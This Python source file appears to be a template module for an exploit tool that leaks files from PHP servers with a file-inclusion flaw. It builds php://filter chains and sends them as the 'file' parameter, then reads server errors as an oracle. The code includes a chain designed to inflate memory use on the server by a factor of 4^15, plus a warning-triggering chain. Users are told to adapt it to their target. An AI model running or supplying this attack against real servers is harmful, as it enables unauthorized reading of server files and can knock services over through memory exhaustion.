"""Holds the class responsible for interacting with the remote server and stating
whether a path is empty or not.

# INSTRUCTIONS

Replace the dummy implementation of Remote.check_path() with a real one that fits your
target. It should return FALSE when the given `php://filter` path causes an error, and
TRUE otherwise.

Use `./lighting.py test` to test your implementation.

# GOING FASTER

If you can tell if PHP produced a warning while processing the path, you can use the
`CHAIN_ERROR` filter chain instead of `CHAIN_BLOW_UP`. It is way faster, as it does not
create a huge memory usage on the server. Change it the `has_contents()` method.
"""

from ten import *

__all__ = ["Remote"]


class Remote:
    CHAIN_BLOW_UP = ("convert.iconv.L1.UCS-4BE",) * 15
    """Chain that will blow up the memory usage of the server if a non-empty stream is
    provided by multiplying it size by 4^15.
    """
    CHAIN_ERROR = (
        "convert.iconv.UTF16.UTF16",
        "convert.quoted-printable-encode",
        "convert.base64-decode",
    )
    """Chain that will produce a PHP warning if a non-empty stream is provided, by
    leveraging filter errors.
    """
    max_path_length: int = 0

    def __init__(self) -> None:
        self.session = Session()
        
    #
    # TODO TODO TODO TODO TODO TODO TODO TODO TODO TODO TODO TODO TODO TODO TODO
    # This is a dummy implementation, which you have to modify to fit your target.
    # TODO TODO TODO TODO TODO TODO TODO TODO TODO TODO TODO TODO TODO TODO TODO
    #
    def oracle(self, path: str) -> bool:
        """Returns `True` if the given `php://filter` path causes an error, `False`
        otherwise.
        """
        # Send request
        
        response = self.session.get(
            "http://127.0.0.1:8000/index.php", params={"file": path}
        )
        
        # Check for errors
        
        if response.code(500):
            return True

        if response.re.search(b"<b>Warning</b>: .*?on line"):
            return True

        if response.contains(b"Allowed memory size of "):
            return True

        return False

    def has_contents(self, filters: tuple[str], resource: str) -> bool:
        """Returns `False` if the applying the given list of filters to the resource
        produces an empty string, `True` otherwise. In other words, it checks if the
        stream resulting from the filters is empty or not.
        
        The method receives a list of filters and a resource.
        
        It should return `False` with the following arguments (empty file):
            - filters = () resource="data:,"
        And `True` with the following arguments:
            - filters = () resource="data:,a" (non empty file)
        """

        # The list of filters provided to this function only contains the filters that
        # may reduce the string to an empty string. To cause an error, either add the
        # `CHAIN_ERROR` or `CHAIN_BLOW_UP` filters, which will have different effects:
        #
        # - `CHAIN_BLOW_UP` will produce a PHP error and a delay if the file is not
        #   empty, nothing otherwise
        # - `CHAIN_ERROR` will produce a PHP warning if the file is not empty, nothing
        #   otherwise
        #
        # If you don't know what you are doing, use `CHAIN_BLOW_UP`, which will surely
        # cause an error. It is, sadly, way slower than the other one.
        #
        filters += self.CHAIN_BLOW_UP
        # filters += self.CHAIN_ERROR

        # Use the `build_path` method to build the complete `php://filter` path.
        path = self._build_path(filters, resource)
        return self.oracle(path)

    def _build_path(self, filters: list[str], resource: str) -> str:
        """Builds a path to be used in the remote server."""
        filters = "|".join(filters)
        path = f"php://filter/{filters}/resource={resource}"
        self.max_path_length = max(self.max_path_length, len(path))
        return path
